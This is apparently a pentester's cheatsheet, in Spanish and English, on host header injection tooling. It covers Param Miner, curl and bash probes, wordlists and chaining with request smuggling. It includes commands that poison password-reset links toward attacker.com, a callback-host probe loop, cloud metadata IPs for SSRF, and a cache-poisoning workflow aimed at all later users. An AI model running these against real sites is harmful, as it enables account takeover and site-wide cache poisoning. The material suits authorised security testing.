---
aliases:
  - HHI Tooling
  - Param Miner Host Header
  - Host Header Wordlists
tags:
  - type/cheatsheet
  - vuln/host-header-injection
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Host Header Injection]]'
  - '[[Burp Suite]]'
---
# Host Header Injection - Tooling

***

## Burp Param Miner

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Instalar | Burp → Extensions → BApp Store → "Param Miner" | Free PortSwigger. |
| Right-click → "Guess headers" | Auto-discover headers que afectan response | Detect XFH, X-Host, etc. |
| Settings → "Identify cache key" | Modo dedicado para cache key analysis | HHI + cache. |
| Force cache miss | Auto cache buster | Per request. |
| Reflection detection | Highlights reflected inputs | Pre-detection. |
| Custom wordlist | Append custom Host-related headers | Extender. |
| Default wordlist | Includes XFH, X-Host, Forwarded, etc | Solid baseline. |
| Output panel | Tab "Param Miner" muestra findings | Visual. |
| Combine con Active Scan | HHI vectors detected automated | Comprehensive. |
| Stop on success | Stop fuzz cuando inj confirmed | Optimization. |
| BCheck rules (Burp Pro 2024+) | Modern HHI detection | Newer. |
^hhi-tool-paramminer

___

## Custom curl Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Single Host probe | `curl -H "Host: attacker.com" https://target/...` | Quick. |
| With XFH | `curl -H "X-Forwarded-Host: attacker.com" https://target/...` | Variant. |
| Multiple headers | `curl -H "Host: a" -H "X-Host: b" https://target/...` | Combined. |
| Reset poisoning probe | `curl -X POST -H "Host: attacker" -d 'email=victim@target.com' https://target/forgot` | Direct. |
| Bash loop | Iterate over header list + targets | Bulk. |
| Save responses | `curl -o response_$h.txt ...` per Host value | Forensic. |
| Compare responses | `diff response_normal.txt response_injected.txt` | Detection oracle. |
| Burp Collaborator monitor | Watch Collaborator dashboard while sending | OOB confirm. |
| Cache header fuzz | Iterate `Host` y `X-Forwarded-Host` con `?cb=$RANDOM` | Avoid cache during testing. |
| Header smuggling combo | `curl --resolve` + Host trick | Edge. |
| HTTP/2 :authority | `curl --http2 -H ":authority: attacker.com" ...` | H2 specific. |
^hhi-tool-curl

### Bash one-liner para detección

```bash
TARGET="https://target.com/forgot"
EMAIL="victim@target.com"
COLLABORATOR_HOST="$(./interactsh-client -url-only)"

HEADERS=(
  "Host: $COLLABORATOR_HOST"
  "X-Forwarded-Host: $COLLABORATOR_HOST"
  "X-Host: $COLLABORATOR_HOST"
  "X-HTTP-Host-Override: $COLLABORATOR_HOST"
  "Forwarded: host=$COLLABORATOR_HOST"
  "X-Original-URL: /admin"
)

for h in "${HEADERS[@]}"; do
  echo "=== $h ==="
  curl -s -X POST -H "Host: target.com" -H "$h" \
    -d "email=$EMAIL" "$TARGET"
done

# Watch Collaborator dashboard for callbacks
./interactsh-client -v
```

___

## Wordlists (PayloadsAllTheThings)

| **Wordlist** | **Path / Repo** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - Host Header | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception | Cache adjacent. |
| HackTricks - HHI | https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers | Referencia. |
| SecLists - common headers | `SecLists/Miscellaneous/web/http-request-headers/` | Generic. |
| Custom HTTP headers | `assetnote/wordlists` | Modern. |
| Burp Intruder built-in | "HTTP request headers" payload set | Pro feature. |
| Custom Host values | localhost / 127.0.0.1 / internal-* / dev-* / staging-* | Internal targets. |
| Cloud metadata IPs | 169.254.169.254, 100.100.100.200, etc | SSRF chain. |
| Common subdomains | admin, api, dev, staging, test, internal, jenkins, gitlab | Subdomain enum + HHI. |
| Burp Collaborator dynamic | Per-request unique subdomain | OOB callback. |
| `interactsh` payloads | Same | Alternative. |
^hhi-tool-wordlists

___

## HTTP Smuggler Combo (HRS Extension)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp HTTP Request Smuggler | Identify HRS first | Pre-requisito. |
| Smuggle attack panel | Right-click + Smuggle attack | Setup. |
| Smuggle Host injection | Second request smuggled con malicious Host | Combo HHI + HRS. |
| Smuggle X-Forwarded-Host | Same vector via XFH | Variant. |
| Cache poison via smuggle | Smuggled response cached | Compound chain. |
| Validate impact | Re-fetch normal request → check poisoned response | Verification. |
| HTTP/2 downgrade combo | H2.CL / H2.TE + HHI smuggling | Modern chain. |
| Combine con cache config | If cache trusts XFH | Multi-vector. |
^hhi-tool-smuggler

### HRS + HHI workflow combo

```
1. Identify HRS vector (CL.TE, TE.CL, H2.CL, etc).
2. Use HTTP Request Smuggler ext con cache poisoning combo.
3. Smuggle malicious request:
   POST /forgot HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker.com
   ...
4. Smuggled response cached with attacker.com en `<base href>`.
5. All subsequent legit users hit cache → see attacker domain.
```

___

## Otros Tools y Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `httprobe` | Verify Host responsiveness | Recon adjacent. |
| `host-header-injection-fuzzer` | Custom scripts en GitHub | Various. |
| nuclei templates | `templates/cves/host-header-injection.yaml` | Bulk scan. |
| ZAP active scanner | OWASP ZAP HHI rule | Free alternative. |
| `paramspider` | URL discovery con params | Recon. |
| Burp Collaborator | OOB confirm | Standard. |
| `interactsh-client` | OOB free alternative | Standard. |
| `dnscanary` | DNS-only OOB | Light. |
| Custom Python `requests` | Programmable | Same as curl. |
| `httpx` | Modern HTTP client | Async. |
| `rad` | URL discovery | Recon. |
^hhi-tool-others

***
